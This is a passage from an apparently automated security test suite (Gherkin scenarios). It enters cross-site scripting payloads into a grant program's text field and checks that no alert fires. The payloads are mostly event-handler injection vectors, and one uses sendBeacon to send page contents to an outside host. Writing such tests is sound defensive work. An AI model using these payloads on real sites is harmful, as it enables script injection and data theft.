      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                   | Field                          |
      | <marquee onstart=alert(1)>XSS</marquee> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303946 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                          |
      | <audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303948 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                          | Field                          |
      | <details ontoggle=alert(1) open>test</details> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303949 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                        | Field                          |
      | <style>:target {color: red;}</style><xss id=x style="transition:color 10s" ontransitioncancel=print()></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303951 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                              | Field                          |
      | <xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303959 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                       | Field                          |
      | <style>:target {transform: rotate(180deg);}</style><xss id=x style="transition:transform 2s" ontransitionrun=print()></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303960 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                      | Field                          |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303964 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                               | Field                          |
      | <body onunhandledrejection=alert(1)><script>fetch('//xyz')</script> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303966 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                               | Field                          |
      | <body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303973 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                            | Field                          |
      | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationend="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303974 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                                                                                 | Field                          |
      | <style>keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @303979 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                              | Field                          |
      | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304175 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                              | Field                          |
      | <style>keyframes x{}</style><xss style="animation-name:x" onwebkitanimationstart="alert(1)"></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304178 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                          | Field                          |
      | <style>:target {color:red;}</style><xss id=x style="transition:color 1s" onwebkittransitionend=alert(1)></xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304180 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                        | Field                          |
      | <body onafterprint=alert(1)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304182 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                       | Field                          |
      | <input onauxclick=alert(1)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304183 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                               | Field                          |
      | <a onbeforecopy="alert(1)" contenteditable>test</a> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    And I pause execution for "5" seconds
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304186 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
